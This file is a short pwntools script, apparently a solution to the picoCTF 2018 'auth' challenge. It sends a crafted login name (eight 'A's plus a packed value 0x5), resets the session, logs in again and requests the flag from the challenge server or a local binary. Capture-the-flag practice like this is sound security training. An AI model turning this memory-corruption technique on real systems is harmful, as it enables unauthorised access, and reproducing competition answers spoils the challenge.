#!/usr/bin/env python

from pwn import *
import sys

context.log_level = 'critical'

argc = len(sys.argv)

def command(data):
	p.recvuntil('> ')
	p.sendline(data)
	return p.recvline()

def login(name):
	return command('login ' + name)

def show():
	return command('show')

def reset():
	return command('reset')

def get_flag():
	return command('get-flag')

if argc > 1:
	p = remote('2018shell.picoctf.com', 45906)
else:
	p = process('./auth')

login('A'*8 + p64(0x5))
reset()
login('test')
print get_flag()
p.close()
